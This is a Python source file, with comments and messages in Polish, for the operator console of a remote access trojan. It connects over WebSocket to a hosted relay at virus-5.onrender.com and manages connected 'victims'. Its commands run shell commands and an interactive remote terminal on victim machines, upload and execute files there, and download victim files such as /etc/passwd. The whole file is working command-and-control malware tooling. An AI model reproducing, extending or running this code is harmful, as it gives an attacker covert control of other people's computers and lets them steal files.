import time
import os
import json
import sys
import threading

try:
    from websocket import create_connection, WebSocketConnectionClosedException
except ImportError:
    print("Brak biblioteki websocket-client.")
    print("Uruchom: pip install websocket-client")
    exit(1)

# ─── Konfiguracja ───────────────────────────────────────────────
SERVER_URL = "wss://virus-5.onrender.com/attacker"
RECONNECT_DELAY = 5
SAVE_DIR = os.path.join(os.path.dirname(__file__), "downloads")
# ────────────────────────────────────────────────────────────────

os.makedirs(SAVE_DIR, exist_ok=True)

ws_global = None
current_target = None  # aktualnie wybrany victim
expecting_file = False  # czy czekamy na dane binarne od victima
terminal_mode = False   # czy jesteśmy w trybie interaktywnego terminala
known_victims = set()   # victimi których już widzieliśmy (debounce)


def print_help():
    print("""
╔══════════════════════════════════════════════════════╗
║              ATTACKER — KOMENDY                      ║
╠══════════════════════════════════════════════════════╣
║  victims            — lista podłączonych victimów    ║
║  use <id>           — wybierz victima                ║
║  shell <polecenie>  — wykonaj komendę na victimie    ║
║  terminal           — otwórz interaktywny terminal   ║
║  upload <plik>      — wyślij plik do victima         ║
║  download <ścieżka> — pobierz plik od victima        ║
║  execute <ścieżka>  — uruchom plik na victimie       ║
║  help               — pokaż tę pomoc                 ║
║  exit               — zakończ                        ║
╠══════════════════════════════════════════════════════╣
║  W trybie terminala:                                 ║
║    wpisz komendy jak w normalnym terminalu           ║
║    ~.  lub  exit   — wyjdź z trybu terminala         ║
╚══════════════════════════════════════════════════════╝
""")


def listener_thread(ws):
    """Wątek nasłuchujący odpowiedzi z serwera."""
    global expecting_file, terminal_mode
    while True:
        try:
            raw = ws.recv()
            if not raw:
                break

            # Dane binarne — plik od victima
            if isinstance(raw, bytes):
                filepath = os.path.join(SAVE_DIR, "received_file.bin")
                with open(filepath, "wb") as f:
                    f.write(raw)
                print(f"\n  [↓] Plik zapisany: {filepath} ({len(raw)} B)")
                expecting_file = False
                print("attacker> ", end="", flush=True)
                continue

            # JSON
            try:
                data = json.loads(raw)
            except json.JSONDecodeError:
                print(f"\n  [RAW] {raw}")
                print("attacker> ", end="", flush=True)
                continue

            msg_type = data.get("type", "")
            printed = False  # czy wyświetliliśmy coś na ekranie

            if msg_type == "victims_list":
                victims = data.get("victims", [])
                if victims:
                    print(f"\n  [📋] Podłączeni victimi ({len(victims)}):")
                    for v in victims:
                        print(f"        • {v}")
                else:
                    print("\n  [📋] Brak podłączonych victimów")
                printed = True

            elif msg_type == "victim_connected":
                vid = data.get('id', '?')
                if vid not in known_victims:
                    known_victims.add(vid)
                    print(f"\n  [+] Victim podłączony: {vid}")
                    printed = True
                # Jeśli już znany — cicho (debounce reconnect spamu)

            elif msg_type == "victim_disconnected":
                vid = data.get('id', '?')
                known_victims.discard(vid)
                print(f"\n  [-] Victim rozłączony: {vid}")
                printed = True

            elif msg_type == "shell_result":
                print(f"\n  [💻] Wynik ({data.get('from', '?')}):")
                print(f"  CMD: {data.get('command', '?')}")
                print("  " + "-" * 40)
                for line in data.get("output", "").split("\n"):
                    print(f"  {line}")
                print("  " + "-" * 40)
                printed = True

            elif msg_type == "upload_done":
                print(f"\n  [✓] Plik zapisany na victimie: {data.get('filepath')}")
                printed = True

            elif msg_type == "upload_ready":
                print(f"\n  [⏳] Victim gotowy na odbiór: {data.get('filename')}")
                printed = True

            elif msg_type == "file_incoming":
                expecting_file = True
                print(f"\n  [↓] Plik przychodzi od {data.get('from')} ({data.get('size')} B)...")
                printed = True

            elif msg_type == "download_start":
                expecting_file = True
                print(f"\n  [↓] Victim wysyła plik: {data.get('filepath')} ({data.get('size')} B)")
                printed = True

            elif msg_type == "execute_result":
                print(f"\n  [▶] Wynik wykonania ({data.get('from', '?')}):")
                print(f"  Plik: {data.get('filepath', '?')}")
                print("  " + "-" * 40)
                for line in data.get("output", "").split("\n"):
                    print(f"  {line}")
                print("  " + "-" * 40)
                printed = True

            elif msg_type == "terminal_output":
                # Tryb terminala — drukuj output bez promptu
                sys.stdout.write(data.get("output", ""))
                sys.stdout.flush()
                continue  # nie drukuj "attacker> "

            elif msg_type == "terminal_started":
                print(f"\n  [⌨] Terminal otwarty ({data.get('shell', '?')}, PID {data.get('pid', '?')})")
                print("  Wpisuj komendy. Wyjście: ~. lub exit")
                continue

            elif msg_type == "terminal_stopped":
                print("\n  [⌨] Terminal zamknięty")
                terminal_mode = False
                print("attacker> ", end="", flush=True)
                continue

            elif msg_type == "hello":
                vid = data.get('id', '?')
                if vid not in known_victims:
                    known_victims.add(vid)
                    print(f"\n  [ℹ] Victim info: {data}")
                    printed = True
                # Jeśli już znany — cicho

            elif msg_type == "error":
                print(f"\n  [❌] Błąd: {data.get('msg')}")
                printed = True

            else:
                print(f"\n  [?] {data}")
                printed = True

            # Prompt tylko jeśli faktycznie coś wyświetliliśmy
            if printed and not terminal_mode:
                print("attacker> ", end="", flush=True)

        except WebSocketConnectionClosedException:
            print("\n[!] Połączenie zamknięte")
            break
        except Exception as e:
            print(f"\n[!] Błąd listenera: {e}")
            break


def command_loop(ws):
    """Pętla interaktywna — wpisywanie komend."""
    global current_target, ws_global, terminal_mode

    print_help()

    while True:
        try:
            cmd = input("attacker> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nZamykanie...")
            break

        if not cmd:
            continue

        parts = cmd.split(maxsplit=1)
        action = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""

        if action == "help":
            print_help()

        elif action == "exit":
            break

        elif action == "victims":
            ws.send(json.dumps({"cmd": "list_victims"}))
            # Serwer sam wysyła listę przy połączeniu, ale możemy odświeżyć:
            # (serwer i tak prześle victims_list w odpowiedzi)

        elif action == "use":
            if not arg:
                print("  Podaj ID victima, np.: use PC-OFIARA-Windows")
            else:
                current_target = arg
                print(f"  [✓] Cel ustawiony: {current_target}")

        elif action == "terminal":
            if not current_target:
                print("  Najpierw wybierz victima: use <id>")
                continue
            terminal_mode = True
            ws.send(json.dumps({
                "target": current_target,
                "cmd": "terminal_start"
            }))
            # Pętla interaktywnego terminala
            print("  [⌨] Łączenie z terminalem...")
            time.sleep(0.5)
            while terminal_mode:
                try:
                    line = input()
                except (EOFError, KeyboardInterrupt):
                    terminal_mode = False
                    ws.send(json.dumps({
                        "target": current_target,
                        "cmd": "terminal_stop"
                    }))
                    print("\n  [⌨] Terminal zamknięty (Ctrl+C)")
                    break

                if line.strip() == "~.":
                    terminal_mode = False
                    ws.send(json.dumps({
                        "target": current_target,
                        "cmd": "terminal_stop"
                    }))
                    print("  [⌨] Terminal zamknięty (~.)")
                    break

                ws.send(json.dumps({
                    "target": current_target,
                    "cmd": "terminal_input",
                    "input": line
                }))

        elif action == "shell":
            if not current_target:
                print("  Najpierw wybierz victima: use <id>")
                continue
            if not arg:
                print("  Podaj polecenie, np.: shell whoami")
                continue
            ws.send(json.dumps({
                "target": current_target,
                "cmd": "shell",
                "command": arg
            }))

        elif action == "upload":
            if not current_target:
                print("  Najpierw wybierz victima: use <id>")
                continue
            if not arg or not os.path.isfile(arg):
                print(f"  Plik nie istnieje: {arg}")
                continue
            filename = os.path.basename(arg)
            # 1. Wyślij info JSON
            ws.send(json.dumps({
                "target": current_target,
                "cmd": "upload",
                "filename": filename
            }))
            # 2. Wyślij dane binarne
            time.sleep(0.3)  # daj serwerowi chwilę
            with open(arg, "rb") as f:
                ws.send_binary(f.read())
            print(f"  [↑] Wysłano plik: {arg}")

        elif action == "download":
            if not current_target:
                print("  Najpierw wybierz victima: use <id>")
                continue
            if not arg:
                print("  Podaj ścieżkę na victimie, np.: download /etc/passwd")
                continue
            ws.send(json.dumps({
                "target": current_target,
                "cmd": "download",
                "filepath": arg
            }))

        elif action == "execute":
            if not current_target:
                print("  Najpierw wybierz victima: use <id>")
                continue
            if not arg:
                print("  Podaj ścieżkę pliku do uruchomienia")
                continue
            ws.send(json.dumps({
                "target": current_target,
                "cmd": "execute",
                "filepath": arg
            }))

        else:
            print(f"  Nieznana komenda: {action}. Wpisz 'help'.")


def main():
    global ws_global
    while True:
        try:
            print(f"[*] Łączenie z {SERVER_URL} ...")
            ws = create_connection(SERVER_URL)
            ws_global = ws
            print("[+] Połączono z serwerem!\n")

            # Uruchom wątek nasłuchujący
            t = threading.Thread(target=listener_thread, args=(ws,), daemon=True)
            t.start()

            # Pętla komend
            command_loop(ws)
            ws.close()
            break

        except (WebSocketConnectionClosedException, ConnectionRefusedError) as e:
            print(f"[!] {e}")
        except Exception as e:
            print(f"[!] Błąd: {e}")

        print(f"[*] Ponowna próba za {RECONNECT_DELAY}s ...")
        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    main()